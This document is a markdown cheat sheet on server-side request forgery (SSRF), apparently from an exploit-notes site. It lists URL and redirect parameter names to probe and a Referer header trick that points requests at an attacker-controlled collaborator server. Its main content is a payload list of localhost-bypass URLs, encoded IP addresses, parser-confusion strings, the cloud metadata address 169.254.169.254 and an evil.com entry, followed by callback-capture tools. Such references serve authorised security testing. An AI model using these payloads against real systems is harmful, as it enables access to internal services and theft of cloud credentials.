---
title: SSRF
description: Server side request forgery
---
## Exploit
### Finding ssrf
#### URL parameters
```url
url=
targetUrl=
requestUrl=
path=
```

#### API, webhooks
Look for developer portal, e.g. `developer.example.com`, `example.com/developer`

#### Open redirects
Find open redirects and chain SSRF.
```url
go
return
r_url
returnUrl
returnUri
locationUrl
goTo
return_url
return_uri
ref=
referrer=
backUrl
returnTo
successUrl

```

#### Referer header
Simply set Referer: `https://www.yourdomain.com` and start logging requests via your own private collaborator server.
```http
GET / HTTP/1.1
Host: victim.com
Referer: https://www.yourdomain.com
```

#### PDF generators
[Hunting for SSRF Bugs in PDF Generator](https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/)

### Payload
```url
http://127.0.0.1:80
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
http://127.127.127.127
http://2130706433/ = http://127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
http://0/
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http://169.254.169.254
0://evil.com:80;http://google.com:80

```
### Tools
#### Capturing incoming requests
- [Ngrok](https://ngrok.com/)
- [Localhost.run](http://localhost.run/)
- [LocalXpose](https://exploit-notes.hdks.org/exploit/web/security-risk/ssrf/#localxpose)
- [Pastebin]([https://pastebin.com/](https://pastebin.com/))
- [Interactsh](https://exploit-notes.hdks.org/exploit/web/security-risk/ssrf/#interactsh)